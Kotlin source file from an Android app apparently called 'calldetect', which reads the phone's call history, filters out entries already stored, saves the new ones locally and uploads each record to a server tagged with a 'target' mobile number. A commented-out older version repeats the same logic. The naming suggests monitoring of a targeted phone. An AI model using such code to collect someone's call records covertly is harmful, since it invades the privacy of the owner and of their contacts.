package com.onnetsolution.calldetect.relaunch

import android.content.Context
import android.icu.text.SimpleDateFormat
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.onnetsolution.calldetect.data.ApiService
import com.onnetsolution.calldetect.data.di.NetworkModule
import com.onnetsolution.calldetect.data.local.CallLogDataClass
import com.onnetsolution.calldetect.data.local.TargetUserInfo
import com.onnetsolution.calldetect.presentation.fetchCallLogs
import com.onnetsolution.calldetect.presentation.formatDuration
import com.onnetsolution.calldetect.presentation.isLogAlreadyInserted
import com.onnetsolution.calldetect.repository.CallLogRepo
import com.onnetsolution.calldetect.repository.TargetMobAndDateTimeRepo
import com.onnetsolution.calldetect.repository.UploadCallLogRepo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import java.sql.Date
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.Locale

@RequiresApi(Build.VERSION_CODES.O)
suspend fun InsertUploadCallLogToDatabaseAndServer(context: Context) {
    withContext(Dispatchers.IO) {  // Use runBlocking to make sure the work is synchronous
        val db = TargetUserInfo.getDatabase(context)
        val repo = TargetMobAndDateTimeRepo(db)
        val targetUserData = repo.getMobAndDateTime()
        Log.d("TARGET_USER_DATA", targetUserData.toString())
        val updatedDateTime = targetUserData?.current_date_time

        val callLogrepo = CallLogRepo(db)
        val getCallLog = callLogrepo.getAllCallLogs()
        Log.d("CALL_LOGS_FROM_DB", getCallLog.toString())

        val targetApi = NetworkModule.getInstance().create(ApiService::class.java)
        val callLogRepo = UploadCallLogRepo(targetApi)

        val now = LocalDateTime.now().minusSeconds(1) // Subtract 1 second
        val formatterDate = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
        val updateCurrentDateTime = now.format(formatterDate) // Format the adjusted time
        Log.d("updateCurrentDateTime", updateCurrentDateTime)

        val callLogs = fetchCallLogs(context)
        val seenLogs = mutableSetOf<String>()
        val callLogDataList = callLogs.mapNotNull { log ->
            val logIdentifier = log.date_time
            if (seenLogs.contains(logIdentifier)) {
                null
            } else {
                seenLogs.add(logIdentifier)
                CallLogDataClass(
                    stat = 0,
                    number = log.number,
                    callType = log.type,
                    date = log.date,
                    duration = log.duration,
                    time = log.time,
                    phnDateTime = log.date_time
                )
            }
        }

        if (!(updatedDateTime == null || updatedDateTime.isEmpty())) {
            Log.d("CALL_LOG_DATA_LIST_else", callLogDataList.toString())
            Log.d("IF_ELSE", "else block executed.")

            // Parsing and filtering logic
            val formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
            val parsedUpdatedTime = try {
                LocalDateTime.parse(updatedDateTime, formatter)
            } catch (e: Exception) {
                Log.e("UPDATED_DATETIME_ERROR", "Error parsing updatedDateTime: $updatedDateTime", e)
                null
            }

            if (callLogDataList.isNotEmpty()) {
                if (parsedUpdatedTime != null) {
                    Log.d("CLDL", callLogDataList.size.toString())

                    val filteredLogs = callLogDataList.filter { log ->
                        try {
                            val logTime = LocalDateTime.parse(log.phnDateTime, formatter)
                            logTime > parsedUpdatedTime
                        } catch (e: Exception) {
                            Log.e("LOG_TIME_ERROR", "Error parsing logTime: ${log.phnDateTime}", e)
                            false
                        }
                    }

                    Log.d("FILTERED_LOGS", "Filtered Logs: $filteredLogs")

                    val uniqueFilteredLogs = filteredLogs.filter { log ->
                        !isLogAlreadyInserted(log, getCallLog ?: emptyList())
                    }

                    Log.d("UNIQUE_FILTERED_LOGS", "Unique Filtered Logs: $uniqueFilteredLogs")

                    if (uniqueFilteredLogs.isNotEmpty()) {
                        Log.d("InsertCheck", "Inserting filtered logs: ${uniqueFilteredLogs.size}")
                        val reverseData = uniqueFilteredLogs.reversed()
                        callLogrepo.insertCallLog(reverseData)
                        repo.updateDateTime(updateCurrentDateTime)
                    } else {
                        Log.d("InsertCheck", "No new logs to insert after filtering.")
                    }
                } else {
                    Log.e("FILTERING_ERROR", "Failed to parse updatedDateTime. Skipping filtering.")
                }
            }
        }

        // Uploading the logs
      /*  val uploadedLogs = hashSetOf<String>()
        getCallLog?.forEach { data ->
            val logIdentifier = "${data.number}_${data.phnDateTime}"
            val dateformat = data.date
            val date = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date(dateformat))
            val durationformat = data.duration
            val duration = formatDuration(durationformat)
            Log.d("DATE_DURATION", "$date   $duration")

            if (!uploadedLogs.contains(logIdentifier)) {
                uploadedLogs.add(logIdentifier)
                if (targetUserData != null) {
                    // Upload call logs
                    Log.d("CALL_LOG_UPLOAD", "CallLog uploading to server.")
                    callLogRepo.uploadCallLog(
                        "${targetUserData.target_mob}@${data.number}@${data.callType}@${date}@${data.time}@${data.phnDateTime}@${duration}"
                    ).collect { response ->
                        if (response.isSuccessful) {
                            Log.d("CALL_LOG_UPLOAD", "CallLog uploaded to server.")
                            callLogrepo.deleteAllCallLog()
                        } else {
                            Log.d("CALL_LOG_UPLOAD", "CallLog Not uploaded to server.")
                        }
                    }
                }
            }
        }*/



        // Move the uploadedLogs Set outside the loop to ensure state is preserved
        val uploadedLogs = mutableSetOf<String>()

        getCallLog?.forEach { data ->
            val logIdentifier = "${data.number}_${data.phnDateTime}" // Unique identifier for the log

            // Check if the log has been uploaded already
            if (!uploadedLogs.contains(logIdentifier)) {
                uploadedLogs.add(logIdentifier) // Mark this log as uploaded

                val dateformat = data.date
                val date = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date(dateformat))
                val durationformat = data.duration
                val duration = formatDuration(durationformat)

                Log.d("DATE_DURATION", "$date   $duration")

                if (targetUserData != null) {
                    // Upload call logs
                    Log.d("CALL_LOG_UPLOAD", "CallLog uploading to server.")
                    // Make sure the callLogRepo.uploadCallLog() is called only once for each log
                    callLogRepo.uploadCallLog(
                        "${targetUserData.target_mob}@${data.number}@${data.callType}@${date}@${data.time}@${data.phnDateTime}@${duration}"
                    ).collect { response ->
                        if (response.isSuccessful) {
                            Log.d("CALL_LOG_UPLOAD", "CallLog uploaded to server.")
                            // Delete logs only after successful upload to prevent accidental deletion before upload completes
                            callLogrepo.deleteAllCallLog()
                        } else {
                            Log.d("CALL_LOG_UPLOAD", "CallLog Not uploaded to server.")
                        }
                    }
                }
            } else {
                // Log already uploaded, skipping further upload attempts
                Log.d("CALL_LOG_UPLOAD", "Log already uploaded, skipping: $logIdentifier")
            }
        }

    }
}








/*
@RequiresApi(Build.VERSION_CODES.O)
fun InsertUploadCallLogToDatabaseAndServer(context: Context) {
    CoroutineScope(Dispatchers.IO).launch {
        val db = TargetUserInfo.getDatabase(context)
        val repo = TargetMobAndDateTimeRepo(db)
        val targetUserData = repo.getMobAndDateTime()
        Log.d("TARGET_USER_DATA", targetUserData.toString())
        val updatedDateTime = targetUserData?.current_date_time

        val callLogrepo = CallLogRepo(db)
        val getCallLog = callLogrepo.getAllCallLogs()
        Log.d("CALL_LOGS_FROM_DB", getCallLog.toString())

        val targetApi = NetworkModule.getInstance().create(ApiService::class.java)
        val callLogRepo = UploadCallLogRepo(targetApi)

        val now = LocalDateTime.now().minusSeconds(1) // Subtract 1 second
        val formatterDate = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
        val updateCurrentDateTime = now.format(formatterDate) // Format the adjusted time
        Log.d("updateCurrentDateTime", updateCurrentDateTime)

        val callLogs = fetchCallLogs(context)
        val seenLogs = mutableSetOf<String>()
        val callLogDataList = callLogs.mapNotNull { log ->
            val logIdentifier = log.date_time
            if (seenLogs.contains(logIdentifier)) {
                null
            } else {
                seenLogs.add(logIdentifier)
                CallLogDataClass(
                    stat = 0,
                    number = log.number,
                    callType = log.type,
                    date = log.date,
                    duration = log.duration,
                    time = log.time,
                    phnDateTime = log.date_time
                )
            }
        }


        if (!(updatedDateTime == null || updatedDateTime.isEmpty())) {
            Log.d("CALL_LOG_DATA_LIST_else", callLogDataList.toString())
            Log.d("IF_ELSE", "else block executed.")

            //if(calltime>updatedtime)
            val formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")

// Parse updatedDateTime safely
            val parsedUpdatedTime = try {
                LocalDateTime.parse(updatedDateTime, formatter)
            } catch (e: Exception) {
                Log.e(
                    "UPDATED_DATETIME_ERROR",
                    "Error parsing updatedDateTime: $updatedDateTime",
                    e
                )
                null
            }
            if (callLogDataList.isNotEmpty()) {
// Proceed only if parsedUpdatedTime is valid
                if (parsedUpdatedTime != null) {
                    Log.d("CLDL", callLogDataList.size.toString())

                    val filteredLogs = callLogDataList.filter { log ->
                        try {
                            val logTime = LocalDateTime.parse(log.phnDateTime, formatter)
                            logTime > parsedUpdatedTime
                        } catch (e: Exception) {
                            Log.e(
                                "LOG_TIME_ERROR",
                                "Error parsing logTime: ${log.phnDateTime}",
                                e
                            )
                            false
                        }
                    }


                    Log.d("FILTERED_LOGS", "Filtered Logs: $filteredLogs")

                    val uniqueFilteredLogs = filteredLogs.filter { log ->
                        !isLogAlreadyInserted(log, getCallLog ?: emptyList())
                    }

                    Log.d(
                        "UNIQUE_FILTERED_LOGS",
                        "Unique Filtered Logs: $uniqueFilteredLogs"
                    )

                    if (uniqueFilteredLogs.isNotEmpty()) {
                        Log.d(
                            "InsertCheck",
                            "Inserting filtered logs: ${uniqueFilteredLogs.size}"
                        )
                        val reverseData = uniqueFilteredLogs.reversed()
                        callLogrepo.insertCallLog(reverseData)
                        repo.updateDateTime(updateCurrentDateTime)
                    } else {
                        Log.d("InsertCheck", "No new logs to insert after filtering.")
                    }
                } else {
                    Log.e(
                        "FILTERING_ERROR",
                        "Failed to parse updatedDateTime. Skipping filtering."
                    )
                }

            }
        }

        callLogrepo.getAllCallLogs()
        val uploadedLogs = hashSetOf<String>()

        getCallLog?.forEach { data ->
            val logIdentifier = "${data.number}_${data.phnDateTime}"
            val dateformat = data.date
            val date =
                SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date(dateformat))
            val durationformat = data.duration
            val duration = formatDuration(durationformat)
            Log.d("DATE_DURATION", "$date   $duration")
            if (!uploadedLogs.contains(logIdentifier)) {
                uploadedLogs.add(logIdentifier)
                if (targetUserData != null) {
                    callLogRepo.uploadCallLog(
                        "${targetUserData.target_mob}@${data.number}@${data.callType}@${date}@${data.time}@${data.phnDateTime}@${duration}"
                    ).collect{response->
                        if(response.isSuccessful){
                            callLogrepo.deleteAllCallLog()
                        }else{
                            Log.d("CALL_LOG_UPLOAD","CallLog Not uploaded to server.")
                        }
                    }
                }
            }
        }
    }
}*/
